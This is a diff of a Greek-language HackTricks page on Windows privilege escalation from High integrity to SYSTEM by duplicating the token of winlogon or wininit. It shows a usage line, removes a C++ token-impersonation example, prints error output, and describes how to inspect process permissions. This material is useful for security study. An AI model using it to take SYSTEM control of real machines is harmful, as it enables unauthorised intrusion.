@@ -1,113 +1,28 @@
+# SeImpersonate from High To System
+
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Υποστήριξη HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
+### Κώδικας
 
-## Κώδικας
-
-Ο παρακάτω κώδικας από [εδώ](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Επιτρέπει να **υποδείξετε ένα Process ID ως όρισμα** και θα εκτελεστεί ένα CMD **που τρέχει ως ο χρήστης** της υποδειγμένης διεργασίας.\
-Εκτελώντας σε μια διεργασία υψηλής ακεραιότητας μπορείτε να **υποδείξετε το PID μιας διεργασίας που τρέχει ως σύστημα** (όπως winlogon, wininit) και να εκτελέσετε ένα cmd.exe ως σύστημα.
+Ο παρακάτω κώδικας από [εδώ](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Επιτρέπει να **υποδείξετε ένα Process ID ως επιχείρημα** και μια CMD **που εκτελείται ως ο χρήστης** της υποδεικνυόμενης διαδικασίας θα εκτελείται.\
+Εκτελώντας σε μια διαδικασία Υψηλής Ακεραιότητας μπορείτε να **υποδείξετε το PID μιας διαδικασίας που εκτελείται ως System** (όπως winlogon, wininit) και να εκτελέσετε ένα cmd.exe ως system.
 ```cpp
 impersonateuser.exe 1234
 ```
 {% code title="impersonateuser.cpp" %}
-
-```cpp
-#include <windows.h>
-
-int main()
-{
-    HANDLE hToken;
-    HANDLE hDupToken;
-    DWORD dwSessionId = 0;
-    DWORD dwProcessId = 0;
-    HANDLE hProcess;
-    HANDLE hThread;
-    LPVOID lpEnvironment;
-
-    // Get the current session ID
-    dwSessionId = WTSGetActiveConsoleSessionId();
-
-    // Get the process ID of the current process
-    dwProcessId = GetCurrentProcessId();
-
-    // Open the current process
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
-
-    // Open the primary token of the current process
-    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken))
-    {
-        printf("Failed to open process token\n");
-        return 1;
-    }
-
-    // Duplicate the primary token
-    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken))
-    {
-        printf("Failed to duplicate token\n");
-        return 1;
-    }
-
-    // Impersonate the user associated with the primary token
-    if (!ImpersonateLoggedOnUser(hDupToken))
-    {
-        printf("Failed to impersonate user\n");
-        return 1;
-    }
-
-    // Get the current thread handle
-    hThread = GetCurrentThread();
-
-    // Set the thread token to the impersonated token
-    if (!SetThreadToken(&hThread, hDupToken))
-    {
-        printf("Failed to set thread token\n");
-        return 1;
-    }
-
-    // Load the user profile of the impersonated user
-    if (!LoadUserProfile(hDupToken, &lpEnvironment))
-    {
-        printf("Failed to load user profile\n");
-        return 1;
-    }
-
-    // Do something as the impersonated user
-
-    // Unload the user profile
-    if (!UnloadUserProfile(hDupToken, lpEnvironment))
-    {
-        printf("Failed to unload user profile\n");
-        return 1;
-    }
-
-    // Revert to the original user
-    if (!RevertToSelf())
-    {
-        printf("Failed to revert to self\n");
-        return 1;
-    }
-
-    // Close the handles
-    CloseHandle(hDupToken);
-    CloseHandle(hToken);
-    CloseHandle(hProcess);
-
-    return 0;
-}
-```
-
-{% endcode %}
 ```cpp
 // From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962
 
@@ -240,9 +155,9 @@ return 0;
 ```
 {% endcode %}
 
-## Σφάλμα
+### Σφάλμα
 
-Σε ορισμένες περιπτώσεις, μπορεί να προσπαθήσετε να προσωποποιήσετε το Σύστημα και να μην λειτουργήσει, εμφανίζοντας ένα αποτέλεσμα όπως το παρακάτω:
+Σε ορισμένες περιπτώσεις, μπορεί να προσπαθήσετε να προσποιηθείτε τον System και να μην λειτουργήσει, εμφανίζοντας μια έξοδο όπως η παρακάτω:
 ```cpp
 [+] OpenProcess() success!
 [+] OpenProcessToken() success!
@@ -253,38 +168,37 @@ return 0;
 [-] CreateProcessWithTokenW Return Code: 0
 [-] CreateProcessWithTokenW Error: 1326
 ```
-Αυτό σημαίνει ότι ακόμα κι αν εκτελείστε σε επίπεδο High Integrity, **δεν έχετε αρκετές άδειες**.\
-Ας ελέγξουμε τις τρέχουσες δικαιώματα Διαχειριστή για τις διεργασίες `svchost.exe` με το **processes explorer** (ή μπορείτε επίσης να χρησιμοποιήσετε το process hacker):
+Αυτό σημαίνει ότι ακόμη και αν εκτελείτε σε επίπεδο Υψηλής Ακεραιότητας **δεν έχετε αρκετές άδειες**.\
+Ας ελέγξουμε τις τρέχουσες άδειες Διαχειριστή για τις διαδικασίες `svchost.exe` με **processes explorer** (ή μπορείτε επίσης να χρησιμοποιήσετε το process hacker):
 
-1. Επιλέξτε μια διεργασία του `svchost.exe`
-2. Δεξί κλικ --> Ιδιότητες
-3. Εντός της καρτέλας "Ασφάλεια" κάντε κλικ στο κάτω δεξιά κουμπί "Άδειες"
-4. Κάντε κλικ στο "Προηγμένες ρυθμίσεις"
+1. Επιλέξτε μια διαδικασία του `svchost.exe`
+2. Δεξί Κλικ --> Ιδιότητες
+3. Μέσα στην καρτέλα "Ασφάλεια" κάντε κλικ στο κάτω δεξί κουμπί "Άδειες"
+4. Κάντε κλικ στο "Προχωρημένες"
 5. Επιλέξτε "Διαχειριστές" και κάντε κλικ στο "Επεξεργασία"
-6. Κάντε κλικ στο "Εμφάνιση προηγμένων δικαιωμάτων"
+6. Κάντε κλικ στο "Εμφάνιση προχωρημένων αδειών"
 
-![](<../../.gitbook/assets/image (322).png>)
+![](<../../.gitbook/assets/image (437).png>)
 
-Η προηγούμενη εικόνα περιέχει όλα τα προνόμια που έχουν οι "Διαχειριστές" πάνω στην επιλεγμένη διεργασία (όπως μπορείτε να δείτε, στην περίπτωση του `svchost.exe` έχουν μόνο προνόμια "Ερώτηση").
+Η προηγούμενη εικόνα περιέχει όλα τα προνόμια που έχουν οι "Διαχειριστές" πάνω στη επιλεγμένη διαδικασία (όπως μπορείτε να δείτε στην περίπτωση του `svchost.exe`, έχουν μόνο προνόμια "Ερώτησης")
 
 Δείτε τα προνόμια που έχουν οι "Διαχειριστές" πάνω στο `winlogon.exe`:
 
-![](<../../.gitbook/assets/image (323).png>)
+![](<../../.gitbook/assets/image (1102).png>)
 
-Μέσα σε αυτήν τη διεργασία, οι "Διαχειριστές" μπορούν να "Διαβάσουν Μνήμη" και "Διαβάσουν Άδειες", το οποίο πιθανώς επιτρέπει στους Διαχειριστές να προσομοιώσουν το διακριτικό που χρησιμοποιείται από αυτήν τη διεργασία.
+Μέσα σε αυτή τη διαδικασία, οι "Διαχειριστές" μπορούν να "Διαβάσουν Μνήμη" και "Διαβάσουν Άδειες", που πιθανώς επιτρέπει στους Διαχειριστές να προσποιηθούν το διακριτικό που χρησιμοποιείται από αυτή τη διαδικασία.
 
-
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Συμμετάσχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
